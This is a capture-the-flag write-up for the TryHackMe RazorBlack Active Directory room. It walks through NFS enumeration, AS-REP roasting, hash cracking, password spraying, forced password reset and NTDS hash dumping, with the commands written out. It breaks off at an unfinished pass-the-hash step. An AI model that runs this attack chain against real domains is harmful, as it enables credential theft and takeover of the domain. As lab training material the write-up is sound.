# 11 - AD - RazorBlack

Room Link --> [https://tryhackme.com/room/raz0rblack](https://tryhackme.com/room/raz0rblack)

Nmap scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -p- -sS -sV $ip -T4 -v

# results
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
111/tcp open rpcbind
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldapsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
2049/tcp open nfs
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
3389/tcp open ms-wbt-server
```
{% endcode %}

Smb couldn't be enumerater, so we used NFS.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# There is a /users NFS share.
showmount -e $ip

# make the dir to mount and mount the share.
mkdir /mnt/users
mount -t nfs 10.10.246.30:/users /mnt/users -o nolock

# there are 2 files in it:

daven port   : CTF PLAYER
imogen royce  : CTF PLAYER
tamara vidal  : CTF PLAYER
arthur edwards : CTF PLAYER
carl ingram  : CTF PLAYER (INACTIVE)
nolan cassidy  : CTF PLAYER
reza zaydan : CTF PLAYER
ljudmila vetrova  : CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN
rico delgado  : WEB SPECIALIST
tyson williams  : REVERSE ENGINEERING
steven bradley  : STEGO SPECIALIST
chamber lin  : CTF PLAYER(INACTIVE)

# The name of the txt file gives us the idea that the potential username could contain First letter of first name + Last name (Steven Bradley becomes sbradley). We now modified the entire list to "fNamelName" 
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```
{% endcode %}

Or we can use a tool called [_**generateADusernames**_](https://github.com/w0Tx/generate-ad-username) to change the names format from full name to AD username. For that we need to put the names and information in a file named `userinfo.txt`

{% code overflow="wrap" lineNumbers="true" %}
```bash
root@kali -> nano userinfo.txt

root@kali -> cat userinfo.txt | cut -d':' -f1 | tee user_fullnames.txt
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin

root@kali -> cat user_fullnames.txt | tr ' ' ',' | tee user_file.txt
daven,port,,,
imogen,royce,,
tamara,vidal,,
arthur,edwards,
carl,ingram,,
nolan,cassidy,,
reza,zaydan,
ljudmila,vetrova,,
rico,delgado,,
tyson,williams,,
steven,bradley,,
chamber,lin,,

root@kali -> python3 /opt/generate-ad-username/ADGenerator.py user_file.txt > users.txt
```
{% endcode %}

{% hint style="warning" %}
We could optionally use "kerbrute" to check for valid usernames from the list.

`kerbrute userenum -d raz0rblack.thm --dc 10.10.246.30 users.txt`
{% endhint %}

Since this looks like a list of valid usernames, we can try the **"ASREPRoasting"** attack.

{% code overflow="wrap" lineNumbers="true" %}
```bash
GetNPUsers.py raz0rblack.thm/ -usersfile user.txt -no-pass -dc-ip 10.10.227.117 -outputfile kerberos_users.txt

# results
```
{% endcode %}

<figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption><p>2</p></figcaption></figure>

We got a user "twilliams", cracked his hash with "john".

<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption><p>3</p></figcaption></figure>

twilliams : roastpotatoes

We tested the creds to access the share, but there was nothing important.

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.227.117 -u twilliams -p 'roastpotatoes' --shares
```
{% endcode %}

<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption><p>4</p></figcaption></figure>

There is another folder with an interesting comment `trash` but we don't have permission to read it. We can brute force with **"Crackmapexec"** and see if any other user has the same password or not. So we create a "pass.txt" and put twiliams" password in it, then run it with crackmapexec.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# using crackmapexec for password spraying.
crackmapexec smb 10.10.227.117 -u user.txt -p pass.txt --continue-on-success

# using kerbrute for password spraying.
kerbrute passwordspray --dc 10.10.159.153 -d raz0rblack.thm users.txt 'roastpotatoes'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption><p>5</p></figcaption></figure>

We get a "STATUS\_PASSWORD\_MUST\_CHANGE" message for the user "sbradley", meaning we have to change password for this user. There are 2 tools we could use:

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbpasswd -r 10.10.227.117 -U sbradley
# this worked form me.
smbpasswd.py  sbradley@10.10.227.117
```
{% endcode %}

<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption><p>6</p></figcaption></figure>

We can now access the trash" share as "sbradley"

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.227.117 -u sbradley -p 'Password123!' --shares
smbclient //10.10.140.231/trash -U sbradley
```
{% endcode %}

There are 3 files here.

{% hint style="danger" %}
I had to use Thunar file manager in kali to access the trash share and download the "experiment\_gone\_wrong.zip" file because it wont download through "smbclient" since it's too large.

In thunar file manager, enter: `smb://$ip/trash` - in the address bar, then authenticate.
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
chat_log_20210222143423.txt         
experiment_gone_wrong.zip           
sbradley.txt

# The chat_log_20210222143423.txt has a Conversation between two staff. This gives us an insight on what to do to further exploit the machine.

# - cat chat_log_20210222143423.txt 
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....
The administrator died after this incident.
Press F to pay respects
```
{% endcode %}

Cracking the .zip file, we can use "zip2john" or "fcrackzip"

{% code overflow="wrap" lineNumbers="true" %}
```bash
zip2john experiment_gone_wrong.zip > file
# or
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
```
{% endcode %}

<figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption><p>7</p></figcaption></figure>

The password is `electromagnetismo` and with that I unzipped the file that contained 2 files named `sytem.hive` `ntds.dit` .&#x20;

<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption><p>8</p></figcaption></figure>

As mentioned in the conversation, we can use "secretsdump" to dump the hashes.

{% code overflow="wrap" lineNumbers="true" %}
```bash
secretsdump -ntds ntds.dit -system system.hive LOCAL | tee hash_dump.txt
```
{% endcode %}

We got a huge list of hashes.

**What is Ljudmila’s Hash?**

After formating the list: `cat hash_dump.txt| cut -d ":" -f4 > clean_hashes.txt` - this will format the list and save only the NTHash part.

<figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption><p>9</p></figcaption></figure>

We can use "crackmapexec" for pass the hash attack to discover "**Ljudmila’s Hash"**&#x20;

```
```





























